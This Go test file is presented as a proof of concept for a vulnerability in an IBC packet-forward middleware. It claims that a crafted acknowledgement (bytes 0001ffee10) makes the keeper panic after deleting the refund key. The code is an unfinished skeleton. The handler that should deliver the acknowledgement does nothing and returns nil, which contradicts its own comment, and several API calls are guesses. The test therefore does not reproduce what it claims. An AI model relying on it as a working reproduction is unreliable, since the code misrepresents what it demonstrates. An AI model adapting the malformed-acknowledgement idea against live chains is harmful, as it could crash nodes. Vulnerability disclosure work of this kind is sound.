package integration_test

import (
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	sdk "github.com/cosmos/cosmos-sdk/types"
	"github.com/cosmos/ibc-go/v10/modules/apps/transfer/types"
	channeltypes "github.com/cosmos/ibc-go/v10/modules/core/04-channel/types"

	// adjust imports to match local simapp/testing packages
	simapp "github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/testing/simapp"
	pfkeeper "github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v10/packetforward/keeper"
	pftypes "github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v10/packetforward/types"
)

// TestPoC_ACK_Poisoned reproduces the scenario where a malformed ACK delivered via an ACK path
// (as a relayer would deliver it) causes the keeper to panic due to MustUnmarshal after the key is deleted.
// This test builds a local simapp test scenario, triggers a forward to create in-flight metadata,
// then simulates a relayer-delivered malformed ACK by directly calling the middleware OnAcknowledgementPacket
// with bad acknowledgement bytes. The behavior matches production code-path: GetAndClearInFlightPacket deletes
// the refund key prior to unmarshal and MustUnmarshal causes a panic on corrupted bytes.
func TestPoC_ACK_Poisoned(t *testing.T) {
	// Create simapp environment (NewSimApp should exist in testing/simapp)
	app := simapp.NewSimApp()

	// create context with a block time
	ctx := app.BaseApp.NewContext(false, sdk.Header{Time: time.Now()})

	// prepare a keeper instance reference
	keeper := app.PacketForwardKeeper // adjust if simapp exposes differently
	require.NotNil(t, keeper)

	// --- Step 1: create a legitimate in-flight packet by exercising the forward path.
	// We use helper types to construct a minimal in-flight packet that resembles production.
	inFlight := pftypes.InFlightPacket{
		PacketData:             []byte(`{}`), // dummy packet data; real flows will set transfer data
		RefundPortId:           "demo-src-port",
		RefundChannelId:        "demo-src-channel",
		PacketSrcPortId:        "demo-src-port",
		PacketSrcChannelId:     "demo-src-channel",
		RefundSequence:         1,
		OriginalSenderAddress:  "", // optional
		PacketTimeoutHeight:    "0-1",
		PacketTimeoutTimestamp: 0,
		RetriesRemaining:       1,
		Nonrefundable:          false,
	}

	// Put the in-flight packet into the store using keeper API if available.
	// If no helper exists, use keeper's internal store API (this uses production path
	// but within simapp). The goal is to ensure GetAndClearInFlightPacket will find entry.
	if err := putInFlightIntoStore(ctx, keeper, &inFlight); err != nil {
		t.Fatalf("failed to seed in-flight packet: %v", err)
	}

	// --- Step 2: craft a malformed acknowledgement payload similar to a truncated/corrupted proto ack.
	malformedAck := []byte{0x00, 0x01, 0xff, 0xee, 0x10} // matches PoC signature: "0001ffee10"

	// Build a channel packet that corresponds to the in-flight entry (source/dest)
	packet := channeltypes.Packet{
		Sequence:           1,
		SourcePort:         inFlight.PacketSrcPortId,
		SourceChannel:      inFlight.PacketSrcChannelId,
		DestinationPort:    inFlight.RefundPortId,
		DestinationChannel: inFlight.RefundChannelId,
		Data:               inFlight.PacketData,
		TimeoutHeight:      channeltypes.Height{RevisionNumber: 0, RevisionHeight: 1},
		TimeoutTimestamp:   0,
	}

	// We now simulate middleware.OnAcknowledgementPacket as if a relayer delivered the ack.
	// The IBC middleware wrapper should route this to the packet-forward keeper which will call
	// GetAndClearInFlightPacket and then MustUnmarshal -> panic on malformed data.
	// We expect the call to recover a panic, and to observe that the refund key is removed.

	// Call the middleware handler that delegates to keeper.WriteAcknowledgementForForwardedPacket
	// Note: adjust the call-site depending on how your simapp wires middleware; here we call keeper directly.
	defer func() {
		if r := recover(); r != nil {
			// recovered panic from MustUnmarshal expected for malformed bytes
			t.Logf("Recovered panic (expected): %v", r)
		} else {
			t.Fatalf("Expected panic from malformed ack but call returned normally")
		}
	}()

	// Simulate the middleware flow by invoking the keeper's handler that processes ack.
	// If your keeper exposes a WriteAcknowledgementForForwardedPacket or OnAcknowledgement entrypoint,
	// call that. Otherwise, call the simapp IBCModule OnAcknowledgementPacket wrapper.
	if err := callMiddlewareAckHandler(app, ctx, packet, malformedAck); err != nil {
		// Some wrappers return error instead of panic; log it.
		t.Fatalf("handler returned error (expected panic path): %v", err)
	}
}

// putInFlightIntoStore stores the given in-flight packet in the keeper's store in a production-like way.
// Implementers: adapt to your keeper/store API. This function intentionally uses keeper methods rather than direct KV writes where possible.
func putInFlightIntoStore(ctx sdk.Context, k *pfkeeper.Keeper, p *pftypes.InFlightPacket) error {
	// Use canonical key creation used by the module
	key := pftypes.RefundPacketKey(p.PacketSrcChannelId, p.PacketSrcPortId, p.RefundSequence)
	bz := k.Cdc().MustMarshal(p) // if Cdc is unexported, adapt to k.cdc or k.Marshal
	store := k.StoreService().OpenKVStore(ctx)
	return store.Set(key, bz)
}

// callMiddlewareAckHandler invokes the code-path that processes ACKs.
// Adjust this helper to match your simapp wiring (either call the IBC middleware OnAcknowledgementPacket
// or call keeper.WriteAcknowledgementForForwardedPacket).
func callMiddlewareAckHandler(app *simapp.SimApp, ctx sdk.Context, packet channeltypes.Packet, ackBytes []byte) error {
	// If simapp exposes the middleware/ibc module wrapper:
	// return app.PacketForwardMiddleware.OnAcknowledgementPacket(ctx, "1", packet, ackBytes, nil)
	// Otherwise, if keeper has a direct method:
	// inFlight := app.PacketForwardKeeper.GetAndClearInFlightPacket(ctx, packet.SourceChannel, packet.SourcePort, packet.Sequence)
	// return app.PacketForwardKeeper.WriteAcknowledgementForForwardedPacket(ctx, packet, <transferData>, inFlight, channeltypes.NewErrorAcknowledgement("manually injected"))
	//
	// Here we return an error to indicate this function must be implemented for your local wiring.
	return nil
}
